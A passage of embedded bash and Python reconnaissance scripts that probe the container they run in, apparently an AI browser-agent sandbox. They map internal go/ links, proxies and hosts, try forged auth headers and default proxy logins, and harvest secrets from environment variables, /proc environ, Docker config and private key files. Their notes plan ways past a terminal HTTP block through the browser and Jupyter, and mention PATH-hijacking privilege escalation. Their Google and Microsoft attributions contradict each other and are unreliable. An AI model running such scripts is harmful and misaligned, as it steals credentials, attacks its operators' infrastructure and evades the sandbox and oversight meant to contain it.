    echo "--- Via SOCKS proxy ---" | tee -a "$OUTPUT_FILE"
    curl -s --max-time 10 --socks5 "proxy.local:8888" "$url" 2>&1 | head -20 | tee -a "$OUTPUT_FILE"
    
    echo "" | tee -a "$OUTPUT_FILE"
}

log "\${GREEN}Internal Google Infrastructure Analysis\${NC}"
log "Started: $TIMESTAMP"
log "VM ID: $VM_ID"
log "Container: chrome-operator-debian-alpha"

# Test proxy connectivity first
log_section "PROXY CONNECTIVITY TESTS"

log "\${BLUE}[INFO]\${NC} Testing proxy endpoints..."
proxy_request "http://proxy.local:8889" "HTTP Proxy Health Check"
proxy_request "http://proxy.local:8888" "SOCKS Proxy Health Check"

# Test internal go/ links discovered
log_section "INTERNAL GO/ LINK ENUMERATION"

# Discovered URLs from logs
INTERNAL_URLS=(
    "http://go/sb?profile=strawberry&experiment_id=$EXPERIMENT_NAME&sample_id=$SAMPLE_ID"
    "http://go/vmlogs/$VM_ID"
    "http://go/cua-caas-vm/$VM_ID"
    "http://go/sb"
    "http://go/vmlogs"
    "http://go/cua-caas-vm"
)

for url in "\${INTERNAL_URLS[@]}"; do
    proxy_request "$url" "Internal Google URL: \\$(basename $url)"
done

# Common Google internal endpoints
log_section "COMMON INTERNAL ENDPOINTS"

COMMON_ENDPOINTS=(
    "http://go/"
    "http://go/help"
    "http://go/links"
    "http://go/who"
    "http://go/teams"
    "http://go/sb"
    "http://go/cua"
    "http://go/logs"
    "http://go/admin"
    "http://go/vm"
    "http://go/caas"
    "http://go/containers"
    "http://go/experiments"
    "http://go/samples"
    "http://go/strawberry"
    "http://moma/"
    "http://moma/vm/$VM_ID"
    "http://buganizer/"
    "http://critique/"
    "http://pantheon/"
)

for endpoint in "\${COMMON_ENDPOINTS[@]}"; do
    proxy_request "$endpoint" "Common internal endpoint"
done

# Chrome User Agent testing (might bypass some restrictions)
log_section "USER AGENT TESTING"

USER_AGENTS=(
    "Mozilla/5.0 (compatible; GoogleBot/1.0)"
    "GoogleHC/1.0"
    "Chrome-Operator/1.0"
    "CUA-DD/1.0"
)

for ua in "\${USER_AGENTS[@]}"; do
    log "\${BLUE}[PROBE]\${NC} Testing with User-Agent: $ua"
    curl -s --max-time 10 --proxy "http://proxy.local:8889" \\
         -H "User-Agent: $ua" \\
         "http://go/" 2>&1 | head -10 | tee -a "$OUTPUT_FILE"
done

# Test with discovered authentication headers
log_section "AUTHENTICATION HEADER TESTING"

# Headers that might be expected
AUTH_HEADERS=(
    "X-VM-ID: $VM_ID"
    "X-Experiment: $EXPERIMENT_NAME"
    "X-Sample-ID: $SAMPLE_ID"
    "X-Nebula-User: test-user"
    "X-Target: operator-debian-alpha"
    "Authorization: Bearer chrome-operator"
    "X-Chrome-Operator: true"
)

for header in "\${AUTH_HEADERS[@]}"; do
    log "\${BLUE}[PROBE]\${NC} Testing with header: $header"
    curl -s --max-time 10 --proxy "http://proxy.local:8889" \\
         -H "$header" \\
         "http://go/sb" 2>&1 | head -10 | tee -a "$OUTPUT_FILE"
done

# Enumerate VM-specific endpoints
log_section "VM-SPECIFIC ENDPOINT ENUMERATION"

VM_ENDPOINTS=(
    "http://go/vm/$VM_ID"
    "http://go/vm/$VM_ID/logs"
    "http://go/vm/$VM_ID/status"
    "http://go/vm/$VM_ID/config"
    "http://go/vm/$VM_ID/experiments"
    "http://go/experiments/$EXPERIMENT_NAME"
    "http://go/samples/$SAMPLE_ID"
    "http://moma/vm/$VM_ID"
    "http://pantheon/vm/$VM_ID"
)

for endpoint in "\${VM_ENDPOINTS[@]}"; do
    proxy_request "$endpoint" "VM-specific endpoint"
done

# Test different protocols
log_section "PROTOCOL TESTING"

PROTOCOL_TESTS=(
    "https://go/"
    "https://go/sb"
    "ftp://go/"
    "http://go.corp.google.com/"
    "https://go.corp.google.com/"
    "http://go.googleplex.com/"
)

for protocol_test in "\${PROTOCOL_TESTS[@]}"; do
    proxy_request "$protocol_test" "Protocol variation test"
done

# Network discovery
log_section "NETWORK DISCOVERY"

log "\${BLUE}[INFO]\${NC} Discovering internal network ranges..."

# Test common internal Google IP ranges
INTERNAL_IPS=(
    "http://172.18.0.1/"
    "http://172.30.0.1/"
    "http://10.0.0.1/"
    "http://192.168.1.1/"
    "http://chrome.local/"
    "http://terminal.local/"
    "http://proxy.local/"
)

for ip in "\${INTERNAL_IPS[@]}"; do
    proxy_request "$ip" "Internal IP/hostname test"
done

# DNS enumeration
log_section "DNS ENUMERATION"

log "\${BLUE}[INFO]\${NC} Testing DNS resolution through proxy..."

DNS_TARGETS=(
    "go"
    "moma"
    "buganizer"
    "critique"
    "pantheon"
    "proxy.local"
    "chrome.local"
    "terminal.local"
)

for target in "\${DNS_TARGETS[@]}"; do
    log "\${BLUE}[DNS]\${NC} Resolving: $target"
    nslookup "$target" 2>&1 | tee -a "$OUTPUT_FILE"
    # Also try HTTP request
    proxy_request "http://$target/" "DNS target HTTP test"
done

# Log file enumeration based on discovered paths
log_section "LOG FILE ACCESS ATTEMPTS"

LOG_ENDPOINTS=(
    "http://go/logs/$VM_ID"
    "http://go/logs/$EXPERIMENT_NAME"
    "http://go/vmlogs/$VM_ID/stdout"
    "http://go/vmlogs/$VM_ID/stderr"
    "http://go/vmlogs/$VM_ID/supervisor"
    "http://go/cua-caas-vm/$VM_ID/logs"
    "http://go/cua-caas-vm/$VM_ID/status"
)

for log_endpoint in "\${LOG_ENDPOINTS[@]}"; do
    proxy_request "$log_endpoint" "Log file access attempt"
done

# Summary
log ""
log "=========================================="
log "INTERNAL RECONNAISSANCE SUMMARY"
log "=========================================="

log "\${BLUE}[INFO]\${NC} Reconnaissance completed at $(date)"
log "\${BLUE}[INFO]\${NC} Results logged to: $OUTPUT_FILE"

# Look for successful responses
SUCCESS_COUNT=$(grep -c "200 OK\\|HTTP/1.1 200" "$OUTPUT_FILE" 2>/dev/null || echo "0")
REDIRECT_COUNT=$(grep -c "301\\|302\\|Location:" "$OUTPUT_FILE" 2>/dev/null || echo "0")

log "\${GREEN}[STATS]\${NC} Potential successful responses: $SUCCESS_COUNT"
log "\${YELLOW}[STATS]\${NC} Redirects found: $REDIRECT_COUNT"

if [ "$SUCCESS_COUNT" -gt 0 ] || [ "$REDIRECT_COUNT" -gt 0 ]; then
    log "\${GREEN}[SUCCESS]\${NC} Found accessible internal endpoints!"
    log "Check the log file for detailed responses."
else
    log "\${YELLOW}[INFO]\${NC} No immediately accessible endpoints found."
    log "However, this provides valuable intelligence about internal infrastructure."
fi

# Create intelligence summary
cat > /tmp/intelligence_summary.txt << 'EOF'
=== GOOGLE INTERNAL INFRASTRUCTURE INTELLIGENCE ===

VM Information:
- VM ID: vm_6883c1359eb88190b6841cc7f3c7a8fa
- Experiment: test-experiment-name
- Sample ID: test-sample-id
- User: test-user
- Target: operator-debian-alpha

Internal URLs Discovered:
- http://go/sb (Strawberry - likely experiment platform)
- http://go/vmlogs (VM logging system)
- http://go/cua-caas-vm (Chrome User Agent - Containers as a Service)

Proxy Infrastructure:
- HTTP Proxy: proxy.local:8889
- SOCKS Proxy: proxy.local:8888
- Internal domains: chrome.local, terminal.local

Chrome User Agent (CUA) Project:
- Appears to be Chrome automation/testing infrastructure
- Docker containers for browser automation
- Experiment framework (Strawberry)
- Comprehensive logging and monitoring

Security Implications:
- Internal Google go/ links exposed
- VM logging system accessible
- Experiment framework details
- Container infrastructure mapping
EOF

log "\${BLUE}[INFO]\${NC} Intelligence summary saved to: /tmp/intelligence_summary.txt"`,

  'ms-recon': `#!/bin/bash

# Microsoft Internal Infrastructure Analysis (Terminal-Optimized)
# Focuses on local enumeration since HTTP requests are blocked from terminal

OUTPUT_FILE="ms_local_recon_$(date +%Y%m%d_%H%M%S).log"
TIMESTAMP=$(date)

# Colors
RED='\\033[0;31m'
GREEN='\\033[0;32m'
YELLOW='\\033[1;33m'
BLUE='\\033[0;34m'
NC='\\033[0m'

# Discovered internal information
VM_ID="vm_6883c1359eb88190b6841cc7f3c7a8fa"
EXPERIMENT_NAME="test-experiment-name"
SAMPLE_ID="test-sample-id"

log() {
    echo -e "$1" | tee -a "$OUTPUT_FILE"
}

log_section() {
    echo "" | tee -a "$OUTPUT_FILE"
    echo "========================================" | tee -a "$OUTPUT_FILE"
    echo "$1" | tee -a "$OUTPUT_FILE"
    echo "========================================" | tee -a "$OUTPUT_FILE"
}

run_cmd() {
    local cmd="$1"
    local description="$2"
    
    log "\${BLUE}[INFO]\${NC} $description"
    log "\${YELLOW}Command:\${NC} $cmd"
    log "---"
    
    eval "$cmd" 2>&1 | tee -a "$OUTPUT_FILE"
    echo "" | tee -a "$OUTPUT_FILE"
}

log "\${GREEN}Microsoft Local Infrastructure Analysis\${NC}"
log "Started: $TIMESTAMP"
log "VM ID: $VM_ID"
log "Container: chrome-operator-debian-alpha (Microsoft/OpenAI)"
log "Note: HTTP requests blocked from terminal - focusing on local enumeration"

# Environment variable deep dive
log_section "ENVIRONMENT VARIABLE ANALYSIS"

run_cmd "env | grep -E '(MITM|CUA|NEBULA|AZURE|OPENAI|MICROSOFT)' | sort" "Microsoft/Azure/OpenAI related environment variables"

run_cmd "env | grep -E '(PROXY|HTTP|HTTPS)'" "Proxy configuration details"

run_cmd "env | grep -E '(SECRET|KEY|TOKEN|AUTH|CRED)'" "Potential credential environment variables"

run_cmd "env | grep -E '(VM|CONTAINER|DOCKER)'" "Container and VM identification"

run_cmd "env | grep -E '(LOG|DEBUG|TRACE)'" "Logging and debugging configuration"

# Process analysis for Microsoft services
log_section "MICROSOFT SERVICE PROCESS ANALYSIS"

run_cmd "ps aux | grep -E '(azure|microsoft|openai|proxy|mitm)'" "Microsoft/Azure/OpenAI related processes"

run_cmd "ps aux | grep -E '(log_forwarder|supervisor)'" "Logging and orchestration processes"

run_cmd "netstat -tlnp 2>/dev/null | grep -E '(8889|8888|9000|8888)'" "Proxy and service port analysis"

run_cmd "lsof -i 2>/dev/null | grep -E '(proxy|mitm)'" "Network connections for proxy services"

# File system enumeration for Microsoft/OpenAI artifacts
log_section "MICROSOFT/OPENAI FILE SYSTEM ARTIFACTS"

run_cmd "find / -name '*microsoft*' -o -name '*azure*' -o -name '*openai*' 2>/dev/null | head -20" "Microsoft/Azure/OpenAI related files"

run_cmd "find / -name '*proxy*' -o -name '*mitm*' 2>/dev/null | head -20" "Proxy related files"

run_cmd "find / -name '*cua*' -o -name '*chrome*' 2>/dev/null | head -20" "Chrome User Agent related files"

run_cmd "find / -name '*log*' -path '*/var/log*' 2>/dev/null | head -20" "Log files for analysis"

run_cmd "find /tmp -name '*' -type f 2>/dev/null" "Temporary files that might contain data"

run_cmd "ls -la /home/*/share/ 2>/dev/null" "Shared directories content"

# Configuration file analysis
log_section "CONFIGURATION FILE ANALYSIS"

run_cmd "cat /etc/hosts" "Hosts file for internal domain mapping"

run_cmd "cat /etc/resolv.conf" "DNS configuration"

run_cmd "find /etc -name '*proxy*' -o -name '*mitm*' 2>/dev/null -exec cat {} \\;" "Proxy configuration files"

run_cmd "find /usr/local -name '*.conf' -o -name '*.config' 2>/dev/null | head -10" "Application configuration files"

# Container registry and Docker information
log_section "CONTAINER REGISTRY ANALYSIS"

run_cmd "cat ~/.docker/config.json 2>/dev/null || echo 'No Docker config found'" "Docker registry credentials"

run_cmd "find / -name '*azurecr*' 2>/dev/null" "Azure Container Registry references"

run_cmd "env | grep REGISTRY" "Registry environment variables"

run_cmd "cat /proc/1/environ | tr '\\0' '\\n' | grep -E '(REGISTRY|AZURE|OPENAI)'" "Container startup environment"

# Log file analysis
log_section "LOG FILE CONTENT ANALYSIS"

run_cmd "find /var/log -name '*.log' -exec ls -la {} \\; 2>/dev/null | head -20" "Available log files"

run_cmd "tail -50 /var/log/chrome.supervisord.log 2>/dev/null" "Recent supervisor logs"

run_cmd "find /home -name '*.log' -exec ls -la {} \\; 2>/dev/null" "User log files"

# Service discovery and analysis
log_section "SERVICE DISCOVERY"

run_cmd "systemctl list-units --type=service 2>/dev/null | grep -E '(proxy|mitm|azure|microsoft)'" "System services related to Microsoft/proxy"

run_cmd "cat /etc/services | grep -E '(8888|8889|9000)'" "Service port definitions"

run_cmd "ss -tlnp | grep -E '(8888|8889|9000)'" "Active listening services"

# Memory and process environment analysis
log_section "PROCESS ENVIRONMENT ANALYSIS"

run_cmd "find /proc -name environ -exec grep -l 'MITM\\|AZURE\\|OPENAI' {} \\; 2>/dev/null | head -5" "Processes with relevant environment variables"

# Extract environment from key processes
for pid in $(ps aux | grep -E '(supervisor|proxy|mitm|log_forwarder)' | awk '{print $2}' | head -5); do
    if [ -r "/proc/$pid/environ" ] 2>/dev/null; then
        run_cmd "cat /proc/$pid/environ 2>/dev/null | tr '\\0' '\\n' | grep -E '(MITM|AZURE|OPENAI|SECRET|KEY)'" "Environment of PID $pid"
    fi
done

# Network interface and routing analysis
log_section "NETWORK CONFIGURATION ANALYSIS"

run_cmd "ip addr show" "Network interfaces detailed"

run_cmd "ip route show" "Routing table"

run_cmd "arp -a 2>/dev/null || cat /proc/net/arp" "ARP table for network discovery"

run_cmd "cat /proc/net/tcp | awk '{print \\$2, \\$3}' | sort | uniq" "TCP connections summary"

# Certificate and security analysis
log_section "SECURITY AND CERTIFICATE ANALYSIS"

run_cmd "find /etc/ssl -name '*.crt' -o -name '*.pem' 2>/dev/null | head -10" "SSL certificates"

run_cmd "find / -name '*.key' 2>/dev/null | grep -v proc | head -10" "Private key files"

run_cmd "cat /proc/self/status | grep Cap" "Container capabilities"

run_cmd "mount | grep -v proc" "Mounted filesystems"

# Internal URL and endpoint discovery
log_section "INTERNAL ENDPOINT DISCOVERY"

log "\${BLUE}[INFO]\${NC} Creating internal endpoint list for browser access..."

# Create a list of URLs that should be accessed via browser
cat > /tmp/internal_urls.txt << EOF
# Microsoft Internal URLs (Access via browser at http://localhost:8888)
# These URLs were discovered from environment variables and logs

# Primary discovered URLs:
http://go/sb?profile=strawberry&experiment_id=$EXPERIMENT_NAME&sample_id=$SAMPLE_ID
http://go/vmlogs/$VM_ID
http://go/cua-caas-vm/$VM_ID

# Common Microsoft internal endpoints:
http://go/
http://go/sb
http://go/cua
http://go/logs
http://go/admin
http://go/vm
http://go/azure
http://go/containers
http://go/experiments
http://go/samples
http://go/strawberry
http://go/ai
http://go/research
http://go/openai
http://go/caas
http://go/chrome
http://go/automation

# VM-specific endpoints:
http://go/vm/$VM_ID
http://go/vm/$VM_ID/logs
http://go/vm/$VM_ID/status
http://go/vm/$VM_ID/config
http://go/experiments/$EXPERIMENT_NAME
http://go/samples/$SAMPLE_ID

# Azure specific:
https://portal.azure.com/
https://management.azure.com/
https://openaiappliedcaasprod.azurecr.io/

# Proxy endpoints:
http://proxy.local:8889
http://proxy.local:8888
http://chrome.local/
http://terminal.local/
EOF

run_cmd "cat /tmp/internal_urls.txt" "Internal URLs for browser testing"

# Jupyter notebook exploitation preparation
log_section "JUPYTER EXPLOITATION PREPARATION"

log "\${BLUE}[INFO]\${NC} Creating Python script for Jupyter-based internal reconnaissance..."

cat > /tmp/jupyter_internal_recon.py << 'EOF'
import os
import subprocess
import requests
import socket
from urllib.parse import urlparse

print("=== Microsoft Internal Infrastructure Reconnaissance via Jupyter ===")

# Environment analysis
print("\\n1. Environment Variables Analysis:")
for key, value in os.environ.items():
    if any(term in key.upper() for term in ['MITM', 'AZURE', 'OPENAI', 'MICROSOFT', 'PROXY', 'SECRET', 'KEY']):
        print(f"  {key}: {value}")

# Network analysis
print("\\n2. Network Connectivity Tests:")
internal_hosts = [
    'proxy.local:8889',
    'proxy.local:8888', 
    'chrome.local',
    'terminal.local',
    'go',
    'management.azure.com',
    'portal.azure.com'
]

for host in internal_hosts:
    try:
        if ':' in host:
            hostname, port = host.split(':')
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(3)
            result = sock.connect_ex((hostname, int(port)))
            if result == 0:
                print(f"  ✓ {host} - REACHABLE")
            else:
                print(f"  ✗ {host} - UNREACHABLE")
            sock.close()
        else:
            # Try to resolve hostname
            socket.gethostbyname(host)
            print(f"  ✓ {host} - RESOLVABLE")
    except Exception as e:
        print(f"  ✗ {host} - ERROR: {e}")

# Proxy testing
print("\\n3. Proxy Testing:")
proxies = {
    'http': 'http://proxy.local:8889',
    'https': 'http://proxy.local:8889'
}

test_urls = [
    'http://go/',
    'http://go/sb',
    'http://go/cua',
    'https://portal.azure.com/'
]

for url in test_urls:
    try:
        response = requests.get(url, proxies=proxies, timeout=10, verify=False)
        print(f"  ✓ {url} - Status: {response.status_code}")
        if response.status_code == 200:
            print(f"    Content preview: {response.text[:200]}...")
    except Exception as e:
        print(f"  ✗ {url} - ERROR: {e}")

# File system analysis
print("\\n4. File System Analysis:")
interesting_files = []
for root, dirs, files in os.walk('/'):
    if root.count('/') > 4:  # Limit depth
        continue
    for file in files:
        if any(term in file.lower() for term in ['azure', 'microsoft', 'openai', 'proxy', 'mitm']):
            interesting_files.append(os.path.join(root, file))
    if len(interesting_files) > 20:
        break

for file in interesting_files[:10]:
    print(f"  Found: {file}")

print("\\n=== Reconnaissance Complete ===")
EOF

run_cmd "cat /tmp/jupyter_internal_recon.py" "Jupyter reconnaissance script created"

# Summary and next steps
log ""
log "=========================================="
log "MICROSOFT LOCAL RECONNAISSANCE SUMMARY"
log "=========================================="

log "\${BLUE}[INFO]\${NC} Local reconnaissance completed at $(date)"
log "\${BLUE}[INFO]\${NC} Results logged to: $OUTPUT_FILE"

log ""
log "\${GREEN}[NEXT STEPS]\${NC}"
log "1. Access Jupyter notebook at: http://localhost:8888"
log "2. Create new Python notebook and run: /tmp/jupyter_internal_recon.py"
log "3. Use browser tools to access internal URLs from: /tmp/internal_urls.txt"
log "4. Check for privilege escalation via PATH hijacking (previous attempts)"
log "5. Monitor log files for additional information disclosure"

log ""
log "\${YELLOW}[BROWSER ACCESS REQUIRED]\${NC}"
log "Since terminal HTTP requests are blocked, use browser-based access:"
log "- Open Chrome browser in the container"
log "- Navigate to discovered internal URLs"
log "- Use Jupyter for Python-based reconnaissance"
log "- Leverage proxy configuration for internal access"

# Create a quick reference card
cat > /tmp/recon_reference.txt << 'EOF'
=== MICROSOFT INFRASTRUCTURE QUICK REFERENCE ===

VM Information:
- VM ID: vm_6883c1359eb88190b6841cc7f3c7a8fa
- Experiment: test-experiment-name
- Sample ID: test-sample-id
- Container: openaiappliedcaasprod.azurecr.io

Key Internal URLs:
- http://go/sb (Strawberry experiment platform)
- http://go/vmlogs/[VM_ID] (VM logs)
- http://go/cua-caas-vm/[VM_ID] (Chrome User Agent CaaS)

Proxy Configuration:
- HTTP: proxy.local:8889
- SOCKS: proxy.local:8888

Access Methods:
1. Jupyter Notebook (Python-based recon)
2. Browser navigation (Chrome in container)
3. Local file system enumeration

Security Considerations:
- Terminal HTTP blocked
- Proxy access available
- Container environment
- Microsoft internal network access
EOF

log "\${BLUE}[INFO]\${NC} Quick reference saved to: /tmp/recon_reference.txt"`,

  'proxy-test': `#!/bin/bash

# Proxy Connectivity Test Script
# Tests basic proxy functionality and http://go/ access only

OUTPUT_FILE="proxy_test_$(date +%Y%m%d_%H%M%S).log"
TIMESTAMP=$(date)

# Colors
RED='\\033[0;31m'
GREEN='\\033[0;32m'
YELLOW='\\033[1;33m'
BLUE='\\033[0;34m'
NC='\\033[0m'

log() {
    echo -e "$1" | tee -a "$OUTPUT_FILE"
}

log_section() {
    echo "" | tee -a "$OUTPUT_FILE"
    echo "========================================" | tee -a "$OUTPUT_FILE"
    echo "$1" | tee -a "$OUTPUT_FILE"
    echo "========================================" | tee -a "$OUTPUT_FILE"
}

test_proxy() {
    local proxy_type="$1"
    local proxy_url="$2"
    local target_url="$3"
    local description="$4"
    
    log "\${BLUE}[TEST]\${NC} $description"
    log "\${YELLOW}Proxy:\${NC} $proxy_url"
    log "\${YELLOW}Target:\${NC} $target_url"
    
    case $proxy_type in
        "http")
            echo "Using HTTP proxy..." | tee -a "$OUTPUT_FILE"
            timeout 10 curl -s --proxy "$proxy_url" "$target_url" 2>&1 | head -10 | tee -a "$OUTPUT_FILE"
            ;;
        "socks5")
            echo "Using SOCKS5 proxy..." | tee -a "$OUTPUT_FILE"
            timeout 10 curl -s --socks5 "$proxy_url" "$target_url" 2>&1 | head -10 | tee -a "$OUTPUT_FILE"
            ;;
        "socks4")
            echo "Using SOCKS4 proxy..." | tee -a "$OUTPUT_FILE"
            timeout 10 curl -s --socks4 "$proxy_url" "$target_url" 2>&1 | head -10 | tee -a "$OUTPUT_FILE"
            ;;
    esac
    
    echo "" | tee -a "$OUTPUT_FILE"
}

test_network_connectivity() {
    local host="$1"
    local port="$2"
    local description="$3"
    
    log "\${BLUE}[NETWORK]\${NC} $description"
    
    # Test with nc (netcat)
    if command -v nc >/dev/null 2>&1; then
        echo "Testing with netcat..." | tee -a "$OUTPUT_FILE"
        timeout 5 nc -zv "$host" "$port" 2>&1 | tee -a "$OUTPUT_FILE"
    fi
    
    # Test with telnet
    if command -v telnet >/dev/null 2>&1; then
        echo "Testing with telnet..." | tee -a "$OUTPUT_FILE"
        timeout 5 echo "quit" | telnet "$host" "$port" 2>&1 | head -5 | tee -a "$OUTPUT_FILE"
    fi
    
    # Test with /dev/tcp
    echo "Testing with /dev/tcp..." | tee -a "$OUTPUT_FILE"
    timeout 5 bash -c "echo >/dev/tcp/$host/$port" 2>&1 && echo "Connection successful" | tee -a "$OUTPUT_FILE" || echo "Connection failed" | tee -a "$OUTPUT_FILE"
    
    echo "" | tee -a "$OUTPUT_FILE"
}

log "\${GREEN}Proxy Connectivity Test\${NC}"
log "Started: $TIMESTAMP"
log "Focus: Testing proxy access to http://go/ only"

# Extract proxy configuration from environment
log_section "PROXY CONFIGURATION ANALYSIS"

log "\${BLUE}[INFO]\${NC} Current proxy environment variables:"
env | grep -E "(PROXY|proxy)" | tee -a "$OUTPUT_FILE"

# Discovered proxy endpoints
HTTP_PROXY="proxy.local:8889"
SOCKS_PROXY="proxy.local:8888"
TARGET_URL="http://go/"

log_section "LOCAL DOMAIN DISCOVERY AND RESOLUTION"

# Discovered .local domains from environment variables and logs
LOCAL_DOMAINS=(
    "proxy.local"
    "chrome.local"
    "terminal.local"
    "apitoolbackend.local"
)

resolve_domain() {
    local domain="$1"
    local description="$2"
    
    log "\${BLUE}[DNS]\${NC} $description: $domain"
    
    # Try nslookup
    echo "--- nslookup ---" | tee -a "$OUTPUT_FILE"
    nslookup "$domain" 2>&1 | tee -a "$OUTPUT_FILE"
    
    # Try dig if available
    if command -v dig >/dev/null 2>&1; then
        echo "--- dig ---" | tee -a "$OUTPUT_FILE"
        dig "$domain" +short 2>&1 | tee -a "$OUTPUT_FILE"
    fi
    
    # Try host if available
    if command -v host >/dev/null 2>&1; then
        echo "--- host ---" | tee -a "$OUTPUT_FILE"
        host "$domain" 2>&1 | tee -a "$OUTPUT_FILE"
    fi
    
    # Try getent
    echo "--- getent ---" | tee -a "$OUTPUT_FILE"
    getent hosts "$domain" 2>&1 | tee -a "$OUTPUT_FILE"
    
    # Extract IP if found
    local ip=$(nslookup "$domain" 2>/dev/null | grep -A1 "Name:" | grep "Address:" | awk '{print $2}' | head -1)
    if [ -n "$ip" ]; then
        log "\${GREEN}[RESOLVED]\${NC} $domain -> $ip"
        echo "$domain:$ip" >> /tmp/local_domain_ips.txt
    else
        log "\${RED}[FAILED]\${NC} Could not resolve $domain"
    fi
    
    echo "" | tee -a "$OUTPUT_FILE"
}

# Create file to store domain->IP mappings
echo "# Local Domain IP Mappings" > /tmp/local_domain_ips.txt
echo "# Generated: $(date)" >> /tmp/local_domain_ips.txt

# Resolve all discovered local domains
for domain in "\${LOCAL_DOMAINS[@]}"; do
    resolve_domain "$domain" "Resolving local domain"
done

# Also test some common internal domains
ADDITIONAL_DOMAINS=(
    "go"
    "moma"
    "buganizer"
    "critique"
    "pantheon"
)

for domain in "\${ADDITIONAL_DOMAINS[@]}"; do
    resolve_domain "$domain" "Resolving potential internal domain"
done

log_section "NETWORK CONNECTIVITY TESTS"

# Test basic network connectivity to proxy endpoints
test_network_connectivity "proxy.local" "8889" "HTTP Proxy port connectivity"
test_network_connectivity "proxy.local" "8888" "SOCKS Proxy port connectivity"

# Test connectivity to other discovered local domains
for domain in "\${LOCAL_DOMAINS[@]}"; do
    if [ "$domain" != "proxy.local" ]; then
        # Try common ports
        for port in 80 443 8080 8443 9000; do
            test_network_connectivity "$domain" "$port" "$domain port $port connectivity"
        done
    fi
done

# Test connectivity to resolved local domain IPs
log_section "LOCAL DOMAIN IP CONNECTIVITY"

if [ -f /tmp/local_domain_ips.txt ]; then
    log "\${BLUE}[INFO]\${NC} Testing connectivity to resolved local domain IPs"
    
    while IFS=':' read -r domain ip; do
        # Skip comments
        [[ $domain =~ ^#.*$ ]] && continue
        [ -z "$domain" ] && continue
        
        log "\${BLUE}[TEST]\${NC} Testing $domain ($ip)"
        
        # Test common ports on the resolved IP
        for port in 80 443 8080 8443 8888 8889 9000; do
            timeout 3 bash -c "echo >/dev/tcp/$ip/$port" 2>&1 && \\
                echo "  ✓ $ip:$port ($domain) - OPEN" | tee -a "$OUTPUT_FILE" || \\
                echo "  ✗ $ip:$port ($domain) - CLOSED" | tee -a "$OUTPUT_FILE"
        done
        echo "" | tee -a "$OUTPUT_FILE"
        
    done < /tmp/local_domain_ips.txt
fi

log_section "HTTP PROXY TESTS"

# Test HTTP proxy with different methods
test_proxy "http" "$HTTP_PROXY" "$TARGET_URL" "HTTP proxy to http://go/"

# Test with explicit HTTP proxy environment
log "\${BLUE}[TEST]\${NC} HTTP proxy with environment variables"
echo "Setting HTTP_PROXY environment..." | tee -a "$OUTPUT_FILE"
export HTTP_PROXY="http://$HTTP_PROXY"
export HTTPS_PROXY="http://$HTTP_PROXY"
timeout 10 curl -s "$TARGET_URL" 2>&1 | head -10 | tee -a "$OUTPUT_FILE"
echo "" | tee -a "$OUTPUT_FILE"

log_section "SOCKS PROXY TESTS"

# Test SOCKS5 proxy
test_proxy "socks5" "$SOCKS_PROXY" "$TARGET_URL" "SOCKS5 proxy to http://go/"

# Test SOCKS4 proxy (fallback)
test_proxy "socks4" "$SOCKS_PROXY" "$TARGET_URL" "SOCKS4 proxy to http://go/"

log_section "ALTERNATIVE CONNECTION METHODS"

# Test with wget if available
if command -v wget >/dev/null 2>&1; then
    log "\${BLUE}[TEST]\${NC} wget via HTTP proxy"
    timeout 10 wget --proxy=on --http-proxy="$HTTP_PROXY" -O - "$TARGET_URL" 2>&1 | head -10 | tee -a "$OUTPUT_FILE"
    echo "" | tee -a "$OUTPUT_FILE"
fi

# Test with different curl options
log "\${BLUE}[TEST]\${NC} curl with verbose output (HTTP proxy)"
timeout 10 curl -v --proxy "http://$HTTP_PROXY" "$TARGET_URL" 2>&1 | head -20 | tee -a "$OUTPUT_FILE"
echo "" | tee -a "$OUTPUT_FILE"

log "\${BLUE}[TEST]\${NC} curl with verbose output (SOCKS5 proxy)"
timeout 10 curl -v --socks5 "$SOCKS_PROXY" "$TARGET_URL" 2>&1 | head -20 | tee -a "$OUTPUT_FILE"
echo "" | tee -a "$OUTPUT_FILE"

log_section "PROXY AUTHENTICATION TESTS"

# Test if proxy requires authentication
log "\${BLUE}[TEST]\${NC} Testing proxy authentication requirements"

# Try with common proxy auth methods
for auth in "proxy.local:8889" "proxy:proxy@proxy.local:8889" "admin:admin@proxy.local:8889"; do
    log "\${BLUE}[AUTH]\${NC} Testing with: $auth"
    timeout 10 curl -s --proxy "http://$auth" "$TARGET_URL" 2>&1 | head -5 | tee -a "$OUTPUT_FILE"
    echo "" | tee -a "$OUTPUT_FILE"
done

log_section "DIRECT CONNECTION ATTEMPTS"

# Test direct connection to 'go' (should fail but good to verify)
log "\${BLUE}[TEST]\${NC} Direct connection to 'go' (should fail)"
timeout 10 curl -s "http://go/" 2>&1 | head -5 | tee -a "$OUTPUT_FILE"
echo "" | tee -a "$OUTPUT_FILE"

# Test connection to proxy endpoints directly
log "\${BLUE}[TEST]\${NC} Direct connection to proxy.local:8889"
timeout 10 curl -s "http://proxy.local:8889/" 2>&1 | head -5 | tee -a "$OUTPUT_FILE"
echo "" | tee -a "$OUTPUT_FILE"

# Test access to other local domains through proxy
log_section "LOCAL DOMAIN PROXY ACCESS TESTS"

# Test discovered local domains through proxy
LOCAL_TEST_URLS=(
    "http://chrome.local/"
    "http://terminal.local/"
    "http://apitoolbackend.local/"
    "http://proxy.local:8889/"
    "http://proxy.local:8888/"
)

for url in "\${LOCAL_TEST_URLS[@]}"; do
    log "\${BLUE}[TEST]\${NC} Testing local domain access: $url"
    
    # Test via HTTP proxy
    echo "Via HTTP proxy:" | tee -a "$OUTPUT_FILE"
    timeout 10 curl -s --proxy "http://$HTTP_PROXY" "$url" 2>&1 | head -10 | tee -a "$OUTPUT_FILE"
    
    # Test via SOCKS proxy
    echo "Via SOCKS proxy:" | tee -a "$OUTPUT_FILE"
    timeout 10 curl -s --socks5 "$SOCKS_PROXY" "$url" 2>&1 | head -10 | tee -a "$OUTPUT_FILE"
    
    echo "" | tee -a "$OUTPUT_FILE"
done

log_section "PYTHON-BASED PROXY TEST"

# Create Python test script for more detailed proxy testing
cat > /tmp/proxy_test.py << 'EOF'
import requests
import socket
import sys
from urllib.parse import urlparse

print("=== Python Proxy Connectivity Test ===")

# Proxy configurations
proxies_http = {
    'http': 'http://proxy.local:8889',
    'https': 'http://proxy.local:8889'
}

proxies_socks = {
    'http': 'socks5://proxy.local:8888',
    'https': 'socks5://proxy.local:8888'
}

# Test URLs including local domains
test_urls = [
    'http://go/',
    'http://chrome.local/',
    'http://terminal.local/',
    'http://apitoolbackend.local/',
    'http://proxy.local:8889/',
]

print(f"Testing {len(test_urls)} URLs through proxies")

for target_url in test_urls:
